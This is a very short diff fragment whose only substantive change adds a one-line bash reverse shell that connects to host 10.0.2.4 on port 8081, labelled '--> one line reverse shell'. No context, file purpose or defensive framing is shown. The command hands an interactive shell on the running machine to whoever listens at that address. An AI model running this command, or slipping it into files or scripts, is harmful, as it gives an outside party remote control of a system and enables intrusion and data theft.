@@ -1,1 +1,3 @@
-s
+bash -i >& /dev/tcp/10.0.2.4/8081 0>&1
+--> one line reverse shell
+
